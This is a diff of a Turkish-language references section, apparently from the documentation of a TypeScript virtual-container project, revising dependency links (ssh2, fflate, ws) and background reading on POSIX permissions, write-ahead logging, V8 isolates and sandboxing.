-- **`fflate`** (VFS snapshot sıkıştırması) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
-- **`ws`** (WebSocket shell taşıması) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)
+- **Çevrimiçi demo**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
+- **Mimari kılavuz**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
+- **`ssh2`** (SSH protokol uygulaması): npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
+- **`fflate`** (VFS anlık görüntü sıkıştırma): npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
+- **`ws`** (WebSocket kabuk aktarımı): npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)
 
-### Arka plan okumaları
+### İleri okumalar
 
-- **POSIX izin modeli** -- Open Group spec: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
-- **Yazma-önde günlüğü** (VFS kalıcılığında kullanılan desen) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
-- **V8 Isolate modeli** -- "Gömücü Rehberi": [v8.dev/docs/embed](https://v8.dev/docs/embed)
-- **RISC-V ISA spec** (TinyEMU/JSLinux bağlamı için) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
-- **OpenRISC 1000 mimarisi** -- [opencores.org/or1k](https://opencores.org/or1k/)
-- **"Pyodide sandbox'ında Deno aracılığıyla Python kodu çalıştırma"** -- Simon Willison TIL, Wasm yaklaşımıyla faydalı bir karşılaştırma: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
-- **"Kendi kendine barındırılan QuickJS'yi tarayıcıda çalıştırma"** -- Simon Willison TIL, quickjs-emscripten paket boyutu hakkında: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
+- **POSIX izin modeli**: Open Group Şartnamesi: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
+- **Write-ahead logging** (VFS kalıcılığında kullanılan desen): [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
+- **V8 Isolate modeli**: "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
+- **RISC-V ISA Şartnamesi** (TinyEMU/JSLinux bağlamı için): [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
+- **OpenRISC 1000 Mimarisi**: [opencores.org/or1k](https://opencores.org/or1k/)
+- **"Running Python code in a Pyodide sandbox via Deno"**: Simon Willison TIL, Wasm yaklaşımıyla faydalı kontrast: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
+- **"Running self-hosted QuickJS in a browser"**: Simon Willison TIL, quickjs-emscripten paketi boyutu üzerine: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
